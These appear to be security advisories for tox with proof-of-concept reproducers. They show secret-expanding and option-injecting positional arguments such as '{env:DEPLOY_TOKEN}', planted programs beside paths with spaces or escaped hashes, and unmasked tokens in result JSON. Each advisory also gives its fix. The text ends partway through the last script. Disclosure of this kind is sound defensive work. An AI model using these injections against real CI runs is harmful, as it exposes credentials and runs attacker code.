description:
## Summary

Positional argument reads a withheld environment value. Anthropic OSS Scanner reported this as ANT-2026-G9GXXTYN on
2026-10-22.

## Affected area

Configuration substitution in positional arguments.

## Attacker-controlled input

One positional argument supplied after --. The attacker does not need to edit the trusted tox configuration.

## Affected code

[`Replacer._replace_match()` in `src/tox/config/loader/replacer.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L244)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

At release 4.67.4,
[`replace_pos_args()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L306-L316)
passed forwarded arguments through [`shlex.join()`](https://docs.python.org/3/library/shlex.html#shlex.join) for later
command splitting.
[`Replacer._replace_match()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L240-L253)
then scanned every replacement for another `{...}` expression and expanded it again. A forwarded `{env:DEPLOY_TOKEN}`
reached
[`replace_env()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L335-L365),
which read the host environment. The reproduction shows that the child command did not receive `DEPLOY_TOKEN` in its
environment but did receive its value in argv and logs.
[TOML's explicit `posargs` substitution option](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/toml/_replace.py#L118-L124)
is a separate path.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  'fix the login page' -> argv ['fix the login page']
OBSERVED '{posargs} -p evil -x' -> 151 argv elements, first five: ['{posargs} -p evil -x', '-p', 'evil', '-x -p evil -x', '-p']
OBSERVED '{env:DEPLOY_TOKEN}' -> argv ['e95d38f24b61cd4ea802876e'] (DEPLOY_TOKEN is e95d38f24b61cd4ea802876e)
OBSERVED DEPLOY_TOKEN in the command's environment: False
OBSERVED tox console: py: commands[0]> python record_argv.py e95d38f24b61cd4ea802876e
OBSERVED tox log:     cmd: python record_argv.py e95d38f24b61cd4ea802876e
BUG
```

### Earlier release check

A synthetic `DEPLOY_TOKEN` shows the first affected release and the 4.3.0 gap. The child command does not receive the
token in its environment. Run from any empty directory with uv and Python 3.8 and 3.11 available:

```sh
set -euo pipefail
work=$(mktemp -d)
cat > "$work/tox.ini" <<'INI'
[tox]
skipsdist = true
no_package = true
[testenv:py]
commands = python record_argv.py {posargs}
INI
cat > "$work/record_argv.py" <<'PY'
import json
import os
import sys

with open("seen.json", "w") as out:
    json.dump({"argv": sys.argv[1:], "token_in_env": "DEPLOY_TOKEN" in os.environ}, out)
PY
cd "$work"
for version in 3.20.1 3.21.0; do
  env DEPLOY_TOKEN=synthetic_marker \
    uv run --no-project --python 3.8 --with "tox==$version" \
    tox -e py -- '{env:DEPLOY_TOKEN}' > "run-$version.log"
  printf '%s ' "$version"
  cat seen.json
  printf '\n'
done
for version in 4.3.0 4.3.1 4.67.5; do
  env DEPLOY_TOKEN=synthetic_marker \
    uv run --no-project --python 3.11 --with "tox==$version" \
    tox run -e py -- '{env:DEPLOY_TOKEN}' > "run-$version.log"
  printf '%s ' "$version"
  cat seen.json
  printf '\n'
done
```

```text
3.20.1 {"argv": ["{env:DEPLOY_TOKEN}"], "token_in_env": false}
3.21.0 {"argv": ["synthetic_marker"], "token_in_env": false}
4.3.0 {"argv": ["{env:DEPLOY_TOKEN}"], "token_in_env": false}
4.3.1 {"argv": ["synthetic_marker"], "token_in_env": false}
4.67.5 {"argv": ["{env:DEPLOY_TOKEN}"], "token_in_env": false}
```

The [4.3.0 substitution rewrite](https://github.com/tox-dev/tox/commit/aff1d4d) left the forwarded reference literal;
[4.3.1 recursive replacement](https://github.com/tox-dev/tox/commit/99b849b) resumed the expansion. The earliest
confirmed affected release is 3.21.0, and the latest is 4.67.4. Because 4.3.0 is unaffected, the two GitHub
affected-version entries are `>= 3.21.0, < 4.3.0` and `>= 4.3.1, < 4.67.5`, patched in 4.3.0 and 4.67.5, respectively.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as Reference expander
    A->>J: provide a positional argument containing a config reference
    J->>+T: run with the stated input
    T->>S: expand the argument again as a reference
    Note over T,S: a withheld host value enters argv and the tox log
    deactivate T
```

```python
#!/usr/bin/env python3
import json
import os
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

# set up: the maintainer's project, and a CI secret that tox.ini neither mentions nor passes to commands
project = Path(tempfile.mkdtemp(prefix="tox-posargs-"))
shutil.copy("/tmp/repro.d/tox.ini", project)
shutil.copy("/tmp/repro.d/record_argv.py", project)
deploy_token = secrets.token_hex(12)
ci_env = {**os.environ, "DEPLOY_TOKEN": deploy_token, "NO_COLOR": "1"}


def pipeline_step(value):
    """The trusted CI step  tox run -e py -- "$VALUE"  ; returns what the command saw and what tox printed."""
    tox = subprocess.run(
        ["/opt/venv/bin/tox", "run", "-e", "py", "--", value],
        cwd=project,
        env=ci_env,
        capture_output=True,
        text=True,
        check=True,
    )
    seen = json.loads((project / "seen.json").read_text())
    (project / "seen.json").unlink()
    return seen, tox.stdout


# control: an ordinary value, spaces and all, arrives as exactly one argument
control = "fix the login page"
control_seen, _ = pipeline_step(control)
print("CONTROL ", repr(control), "-> argv", control_seen["argv"])

# attack: the contributor chooses $VALUE and nothing else
splits = "{posargs} -p evil -x"
split_seen, _ = pipeline_step(splits)
reads_secret = "{env:DEPLOY_TOKEN}"
secret_seen, tox_console = pipeline_step(reads_secret)

# check: a correct tox starts the command with argv == [value] in every case
split_argv = split_seen["argv"]
echo_line = next(line for line in tox_console.splitlines() if "commands[0]>" in line)
# tox rewrites this log on every run, so it holds the last one: the {env:DEPLOY_TOKEN} run
command_log = (project / ".tox/py/log/1-commands[0].log").read_text()
log_line = next(line for line in command_log.splitlines() if line.startswith("cmd:"))
print("OBSERVED", repr(splits), "->", len(split_argv), "argv elements, first five:", split_argv[:5])
print("OBSERVED", repr(reads_secret), "-> argv", secret_seen["argv"], "(DEPLOY_TOKEN is", deploy_token + ")")
print("OBSERVED DEPLOY_TOKEN in the command's environment:", secret_seen["DEPLOY_TOKEN in env"])
print("OBSERVED tox console:", echo_line.strip())
print("OBSERVED tox log:    ", log_line)

control_intact = control_seen["argv"] == [control]
options_injected = split_argv[1:3] == ["-p", "evil"]
secret_disclosed = (
    secret_seen["argv"] == [deploy_token]
    and not secret_seen["DEPLOY_TOKEN in env"]
    and deploy_token in echo_line
    and deploy_token in log_line
)
print("BUG" if control_intact and options_injected and secret_disclosed else "OK")
```

summary: Path with spaces can execute a planted program
description:
## Summary

Path with spaces can execute a planted program. Anthropic OSS Scanner reported this as ANT-2026-E07E3WEY on 2026-10-22.

## Affected area

INI command path substitution.

## Attacker-controlled input

A file planted beside a path component that contains a space. The attacker does not need to edit the trusted tox
configuration.

## Affected code

[`ReplaceReferenceIni._load_from_sources()` in `src/tox/config/loader/ini/replace.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/replace.py#L59-L60)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`. The
[INI command conversion](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/__init__.py#L90-L103)
splits the substituted path.

## Mechanism

INI substitution places the path into a command string without preserving it as one argument. The first fragment names
the planted program. See [Python shlex](https://docs.python.org/3/library/shlex.html) for parser behavior.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48` during triage.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  scanner-test writing the project's script: touch: cannot touch '/tmp/shared-workspaces/nightly builds/project/scripts/report.py': Permission denied
CONTROL  tox.toml: tox spawned ['/tmp/shared-workspaces/nightly builds/project/.tox/report/bin/python', '/tmp/shared-workspaces/nightly builds/project/scripts/report.py', '--strict']
OBSERVED tox.ini:  tox spawned ['/tmp/shared-workspaces/nightly builds/project/.tox/report/bin/python', '/tmp/shared-workspaces/nightly', 'builds/project/scripts/report.py', '--strict']
BUG
```

### Earlier release check

The older INI syntax uses `{toxinidir}` for the path tested as `{tox_root}` in 4.67.4. This check creates a script under
a path with spaces and a planted sibling. It tests command selection; the 4.67.4 reproduction above supplies the
separate-account boundary. Run from any empty directory with Docker available:

```sh
set -euo pipefail
work=$(mktemp -d)
mkdir -p "$work/image" "$work/nightly builds/project/scripts"
cat > "$work/image/Dockerfile" <<'DOCKER'
FROM python:2.7-buster
ARG TOX_VERSION
RUN pip install "tox==${TOX_VERSION}" 'virtualenv==16.7.12' 'setuptools==44.1.1'
DOCKER
cat > "$work/nightly builds/project/tox.ini" <<'INI'
[tox]
skipsdist = true
[testenv:report]
commands = python {toxinidir}/scripts/report.py --strict
INI
cat > "$work/nightly builds/project/scripts/report.py" <<'PY'
print("trusted script")
PY
cat > "$work/nightly" <<'PY'
print("planted script")
PY
for version in 1.7.1 1.7.2; do
  docker build -q --build-arg TOX_VERSION="$version" -t "tox-history-8v:$version" "$work/image" > /dev/null
  printf '%s ' "$version"
  docker run --rm --network=none -v "$work:$work:z" \
    -w "$work/nightly builds/project" "tox-history-8v:$version" \
    tox -r -e report | rg '^(trusted|planted) script$'
done
```

```text
1.7.1 trusted script
1.7.2 planted script
```

The installed 1.7.1 parser substitutes after command splitting. In 1.7.2, `_processcommand` substitutes before `shlex`
splits the string. The earliest confirmed affected release is 1.7.2, and the latest is 4.67.4. The affected-version
range is `>= 1.7.2, < 4.67.5`, patched in 4.67.5. The 2.0.0–2.2.1 tox releases also execute the planted file when the
same spaced path is supplied through `{env:SCRIPT_PATH}` from a no-space project; their separate `pip freeze` setup
error prevents this particular spaced-root fixture from reaching the command.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Local account
    participant J as Trusted run
    participant T as tox
    participant S as Command parser
    participant F as File system
    A->>F: plant a file beside a path component containing a space
    J->>+T: run with the stated input
    T->>S: substitute that path into an INI command string
    Note over T,S: the first fragment starts the planted program
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import pwd
import shutil
import subprocess
import sys

workspaces = "/tmp/shared-workspaces"  # like /tmp: sticky, any local account may add an entry, none may touch another's
checkout = f"{workspaces}/nightly builds/project"
planted = f"{workspaces}/nightly"  # the checkout path cut at its first blank
other_account = pwd.getpwnam("scanner-test")
as_other_account = {"user": other_account.pw_uid, "group": other_account.pw_gid, "extra_groups": []}

# set up, as root: one checkout holding the same command as tox.ini and as tox.toml
shutil.rmtree(workspaces, ignore_errors=True)
os.mkdir(workspaces)
os.chmod(workspaces, 0o1777)
os.makedirs(f"{checkout}/scripts")
shutil.copy("/tmp/repro.d/tox.ini", checkout)
shutil.copy("/tmp/repro.d/tox.toml", checkout)
shutil.copy("/tmp/repro.d/report.py", f"{checkout}/scripts/report.py")

touch = subprocess.run(["touch", f"{checkout}/scripts/report.py"], capture_output=True, text=True, **as_other_account)
if touch.returncode == 0:
    sys.exit("setup: scanner-test must not be able to write the checkout")
print(f"CONTROL  scanner-test writing the project's script: {touch.stderr.strip()}")

# attack, as scanner-test: create one file in the shared directory
# (root opens planted.py, so scanner-test needs no access to /tmp/repro.d)
with open("/tmp/repro.d/planted.py") as planted_source:
    subprocess.run(["tee", planted], stdin=planted_source, stdout=subprocess.DEVNULL, check=True, **as_other_account)
print(f"scanner-test (uid {os.stat(planted).st_uid}) created {planted}\n")


# trigger, as root: the user runs the project's tox environment; the result journal records the argv tox spawned
def run_tox_report(config):
    journal = f"{checkout}/journal-{config}.json"
    tox = ["/opt/venv/bin/tox", "-c", config, "run", "-e", "report", "--result-json", journal]
    output = subprocess.run(tox, cwd=checkout, capture_output=True, text=True).stdout
    with open(journal) as journal_file:
        spawned_argv = json.load(journal_file)["testenvs"]["report"]["test"][0]["command"]
    return spawned_argv, output


toml_argv, toml_output = run_tox_report("tox.toml")
print(f"CONTROL  tox.toml: tox spawned {toml_argv}")
print(toml_output)
ini_argv, ini_output = run_tox_report("tox.ini")
print(f"OBSERVED tox.ini:  tox spawned {ini_argv}")
print(ini_output)

# check: `python {tox_root}/scripts/report.py --strict` must spawn the project's script as one argument
expected_args = [f"{checkout}/scripts/report.py", "--strict"]  # after argv[0], the environment's python
path_was_split = ini_argv[1:] != expected_args
planted_ran_as_tox_user = f"planted file {planted} ran as uid {os.geteuid()}" in ini_output
print("BUG" if path_was_split and planted_ran_as_tox_user else "OK")
```

**repro.d/planted.py**

```python
import os
import sys

print(f"planted file {__file__} ran as uid {os.geteuid()} with arguments {sys.argv[1:]}")
```

**repro.d/report.py**

```python
import os
import sys

print(f"project script {__file__} ran as uid {os.geteuid()} with arguments {sys.argv[1:]}")
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

[testenv:report]
commands = python {tox_root}/scripts/report.py --strict
```

**repro.d/tox.toml**

```toml
no_package = true

[env.report]
commands = [["python", "{tox_root}/scripts/report.py", "--strict"]]
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is unlikely because the attack needs a file planted beside a path component that
contains a space.

Severity: CVSS v4.0 base 5.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The referenced program path must contain a space, the trusted configuration must use that path, and the
  attacker must be able to plant the sibling file.
- `PR:L`: The attacker needs permission to create or swap an entry in a local directory.
- `UI:P`: A trusted user or job must run tox after the attacker prepares the path.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.
- `VA:L`: The attacker-controlled code can stop one tox invocation. The reproduction does not establish sustained or
  persistent denial of tox or a direct, serious availability consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. With the fix at
[`b0da80958df94761bff01d6b9ed6b77824dd5a3b`](https://github.com/tox-dev/tox/pull/4290/commits/b0da80958df94761bff01d6b9ed6b77824dd5a3b),
the same isolated reproducer returned `OK`: the trusted project's script ran as uid 0, and the planted sibling file did
not run. [Fix PR #4290](https://github.com/tox-dev/tox/pull/4290) merged on 2026-10-30.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

The historical matrix reproduced the path split on the 314 checked releases below. Historical tox 1.x–3.x reproductions
use `{toxinidir}` or an environment-substituted path; tox 4 uses `{tox_root}`.

## Known mitigation

Use TOML command arrays or keep the path parent inaccessible to other users.

cwes.name: Improper Neutralization of Argument Delimiters in a Command

summary: Inline secret flag value appears in result JSON and retry warning
description:
## Summary

Result JSON exposes an inline secret-looking flag value. At 4.67.4, the retry warning can also expose it. Anthropic OSS
Scanner reported this as ANT-2026-SGVTF7DO on 2026-10-22.

## Affected area

Result JSON command lists and command retry warnings.

## Attacker-controlled input

Read access to a result JSON file or retry log from a run with an inline secret flag. The attacker does not need to edit
the trusted tox configuration.

## Affected code

[`EnvJournal.content()` in `src/tox/journal/env.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/journal/env.py#L50)
and
[`run_command_set()` in `src/tox/session/cmd/run/single.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/session/cmd/run/single.py#L139-L145)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

The result journal has stored the raw command since 1.6.0. At 4.67.4, the
[command echo](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/tox_env/api.py#L508)
uses `shell_cmd_redacted`, while the journal writes
[`Outcome.cmd`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/execute/api.py#L296)
without redaction. The console mask arrived in 4.53.1. At 4.67.4, a failed command's retry warning uses unmasked
[`Command.shell`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/types.py#L64-L66).
Earlier releases wrote the raw command to result JSON and also printed it on the console.

## Reproduction and evidence

The reporter's journal reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access.
It also returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. A retry-warning regression test failed on main before the fix and passed
after it; the release source uses the same unmasked `cmd.shell` call.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
DEPLOY_TOKEN for this run: d5d25117e02240526e9c70a2
CONTROL  terminal          : ["deploy: commands[0]> python deploy.py '--token=************************'"]
CONTROL  .tox/deploy/log/* : ["cmd: python deploy.py '--token=************************'"]
OBSERVED /tmp/ci-artifacts-w3s4bnc9/tox-result.json testenvs.deploy.test[0]:
           run_id          : commands[0]
           command         : ['/tmp/tox-project-p4t8mg7y/.tox/deploy/bin/python', 'deploy.py', '--token=d5d25117e02240526e9c70a2']
           output, err     : '' ''
BUG
```

### Earlier release check

Result JSON has contained a raw inline `--token` value since tox 1.6.0. This synthetic test checks that output path; it
does not test the later retry-warning path. Run from any empty directory with Docker and jq available:

```sh
set -euo pipefail
work=$(mktemp -d)
mkdir -p "$work/image" "$work/project"
cat > "$work/image/Dockerfile" <<'DOCKER'
FROM python:2.7-buster
ARG TOX_VERSION
RUN pip install "tox==${TOX_VERSION}" 'virtualenv==16.7.12' 'setuptools==44.1.1'
DOCKER
cat > "$work/project/tox.ini" <<'INI'
[tox]
skipsdist = true
[testenv:deploy]
commands = python deploy.py --token={env:DEPLOY_TOKEN}
INI
cat > "$work/project/deploy.py" <<'PY'
pass
PY
for version in 1.5.0 1.6.0; do
  docker build -q --build-arg TOX_VERSION="$version" -t "tox-history-cj:$version" "$work/image" > /dev/null
done
if docker run --rm --network=none tox-history-cj:1.5.0 tox --help | rg -q -- '--result-json'; then
  exit 1
fi
printf '1.5.0 --result-json unavailable\n'
docker run --rm --network=none -e DEPLOY_TOKEN=synthetic_marker \
  -v "$work/project:$work/project:z" -w "$work/project" \
  tox-history-cj:1.6.0 tox -r -e deploy --result-json result.json > "$work/run.log"
printf '1.6.0 '
jq -r '.testenvs.deploy.test[0].command[-1]' "$work/project/result.json"
```

```text
1.5.0 --result-json unavailable
1.6.0 --token=synthetic_marker
```

The earliest confirmed affected tox release for the result-JSON path is 1.6.0; the latest is 4.67.4. The
affected-version range is `>= 1.6.0, < 4.67.5`, patched in 4.67.5. Before 4.53.1, the console also printed the raw flag.
From 4.53.1 through 4.67.4, the console masked it while result JSON remained raw. The 4.67.5 result JSON masks the flag.

## Attack sequence

```mermaid
sequenceDiagram
    participant J as Job owner
    participant T as tox
    participant O as Result JSON or retry log
    participant R as Reader
    J->>+T: run with a sensitive value
    T->>O: record the raw command in result JSON or a retry warning
    Note over T,O: the inline secret flag value appears there
    deactivate T
    R->>O: read a result JSON file or retry log
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import secrets
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# set up: the project, and outside it the directory a CI job uploads as artifacts
project = Path(tempfile.mkdtemp(prefix="tox-project-"))
shutil.copy("/tmp/repro.d/tox.toml", project)
shutil.copy("/tmp/repro.d/deploy.py", project)
result_json = Path(tempfile.mkdtemp(prefix="ci-artifacts-")) / "tox-result.json"
token = secrets.token_hex(12)

# run tox the way the CI job does
tox = subprocess.run(
    ["tox", "run", "-e", "deploy", "--result-json", str(result_json)],
    cwd=project,
    env={**os.environ, "DEPLOY_TOKEN": token},
    capture_output=True,
    text=True,
)
terminal = tox.stdout + tox.stderr
if tox.returncode != 0:
    sys.exit(terminal)

logs = "".join(log.read_text() for log in sorted((project / ".tox" / "deploy" / "log").glob("*.log")))
journal_entry = json.loads(result_json.read_text())["testenvs"]["deploy"]["test"][0]

# check: the same run masks the token on the terminal and in .tox logs, but writes it in clear to the journal
masked_flag = "--token=" + "*" * len(token)
clear_flag = "--token=" + token
print("DEPLOY_TOKEN for this run:", token)
print("CONTROL  terminal          :", [line for line in terminal.splitlines() if "--token=" in line])
print("CONTROL  .tox/deploy/log/* :", [line for line in logs.splitlines() if "--token=" in line])
print(f"OBSERVED {result_json} testenvs.deploy.test[0]:")
print("           run_id          :", journal_entry["run_id"])
print("           command         :", journal_entry["command"])
print("           output, err     :", repr(journal_entry["output"]), repr(journal_entry["err"]))

masked_where_shown = masked_flag in terminal and masked_flag in logs and token not in terminal + logs
clear_in_journal = clear_flag in journal_entry["command"]
print("BUG" if masked_where_shown and clear_in_journal else "OK")
```

**repro.d/deploy.py**

```python
"""Stand-in for a deployment tool that takes its credential as --token=...; prints nothing and succeeds."""
```

**repro.d/tox.toml**

```toml
[env.deploy]
package = "skip"
commands = [["python", "deploy.py", "--token={env:DEPLOY_TOKEN}"]]
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

A reader of an accessible result JSON file can see the inline flag value. At 4.67.4, a readable retry warning can expose
the same value. The reproduction does not establish the credential's authority. Exposure is niche because a reader needs
the result JSON or retry log from a run with an inline secret flag. Reproducibility is moderate: the result-JSON route
requires `--result-json`; the retry-warning route requires a failed attempt with retry configured.

For scoring, the conditional path is a public CI log or artifact that a reader can access without tox-host privileges.
The reproducer shows local disclosure; it does not establish that any deployed log is public.

Severity: CVSS v4.0 base 2.0 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The test exposes the value in a local result JSON file; it does not show remote access to that file.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The run must include a sensitive inline flag and produce result JSON readable by the attacker. For the 4.67.4
  retry-warning route, a configured retry and failed attempt are also required.
- `PR:N`: A reader of public CI output needs no prior tox-host privilege.
- `UI:P`: A trusted tox run must produce output that the attacker can read.
- `VC:L`: The test exposes one value; its credential scope remains unknown.
- `VI:N`: No data modification appears in the reproduction.
- `VA:N`: No loss of availability appears in the reproduction.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The journal reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. The fix merged in
[public PR #4264](https://github.com/tox-dev/tox/pull/4264) on 2026-10-29 at commit
`fbe92c05c2d26b51616d4f0e6f37926c207498d2`.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

The historical matrix reproduced the raw result-JSON value on the 318 checked releases below. The retry-warning path was
confirmed at 4.67.4; the range starts at 1.6.0 because the result-JSON path was confirmed there.

## Known mitigation

Keep result JSON files and retry logs private when commands contain inline secret flags.

summary: Escaped hash in a path selects another directory
description:
## Summary

Escaped hash in a path selects another directory. Anthropic OSS Scanner reported this as ANT-2026-L86CEC6H on
2026-10-22.

## Affected area

INI path substitution.

## Attacker-controlled input

A sibling directory planted beside a checkout whose path contains an escaped hash. The attacker does not need to edit
the trusted tox configuration.

## Affected code

[`ReplaceReferenceIni._load_from_sources()` in `src/tox/config/loader/ini/replace.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/replace.py#L60)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

At release 4.67.4,
[`IniLoader.process_raw()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/__init__.py#L60-L68)
removed comments before substitution.
[`ReplaceReferenceIni._load_from_sources()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/replace.py#L50-L60)
then inserted a backslash before every `#` in a referenced value.
[`StrConvert.to_path()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L31-L33)
kept that backslash in a path.
[`run_commands()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/session/cmd/run/single.py#L80-L96)
created and used the resulting `change_dir` as the command working directory. The reproducer planted a script in that
sibling directory and showed tox running it. Command parsing and authored escaped comments are separate from this path
conversion.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48` during triage.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
OBSERVED /tmp/shared-ussts57j/fix\#12/docs/build_docs.py is owned by scanner-test
CONTROL /tmp/shared-ussts57j/fix-12: project's script ran in its docs directory: True
OBSERVED /tmp/shared-ussts57j/fix#12: scanner-test's planted script ran as uid=0: True
BUG
```

At fix commit `3aa307df1778449b9da730f9fcd529d0c1bf396a`, the same reproducer returned `OK` in a disposable container
without network access or `--privileged`. Both runs executed the project's `build_docs.py` from their own checkout. The
`scanner-test` account still owned the planted sibling script, but
`OBSERVED ... scanner-test's planted script ran as uid=0: False`.

### Earlier release check

This isolated test creates a trusted `fix#12` checkout and a planted `fix\#12` sibling for each release. The only
version change is the installed tox wheel.

```sh
#!/usr/bin/env bash
set -euo pipefail
probe_root=$(mktemp -d /tmp/tox-hash-boundary.XXXXXX)
